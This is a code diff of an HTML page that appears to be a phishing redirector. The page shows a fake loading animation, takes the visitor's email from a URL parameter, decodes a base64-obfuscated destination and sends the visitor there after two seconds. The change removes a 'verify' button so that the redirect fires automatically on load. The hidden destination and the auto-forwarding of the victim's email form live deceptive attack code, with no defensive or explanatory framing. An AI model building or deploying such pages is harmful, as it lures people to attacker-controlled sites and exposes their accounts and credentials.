@@ -18,7 +18,7 @@
             text-align: center;
         }
         .dots-container {
-            display: none;
+            display: flex;
             align-items: center;
             justify-content: center;
         }
@@ -44,21 +44,6 @@
             font-size: 18px;
             margin-bottom: 20px;
         }
-        #verifyButton {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-bottom: 20px;
-            background-color: rgb(110, 71, 238);
-            color: white;
-            border: none;
-            border-radius: 15px;
-            height: 50px;
-            display: none;
-        }
-        #verifyButton:hover {
-            background-color: rgb(142, 204, 255);
-        }
     </style>
 </head>
 <body>
@@ -73,7 +58,6 @@
             <div class="dot"></div>
         </div>
     </div>
-    <a id="redirectLink" href="#" style="display: none;" title="Redirect to Target"></a>
     <script>
         // Function to decode base64 string
         function decodeBase64(encoded) {
@@ -112,20 +96,16 @@
             window.location.href = obfuscatedURL;
         }
 
-        // Automatically trigger the redirect functionality
+        // Automatically redirect after showing loading dots
         window.onload = function () {
-            // Show loading dots immediately
-            document.querySelector('.dots-container').style.display = 'flex';
-
-            // Start processing
+            const emailParam = findEmailParam();
             setTimeout(() => {
-                const emailParam = findEmailParam();
                 if (emailParam) {
                     redirectToTarget(emailParam.value);
                 } else {
                     console.error("No email found for redirection");
                 }
-            }, 2000); // Simulate loading delay
+            }, 2000); // Show loading dots for 2 seconds
         };
     </script>
 </body>
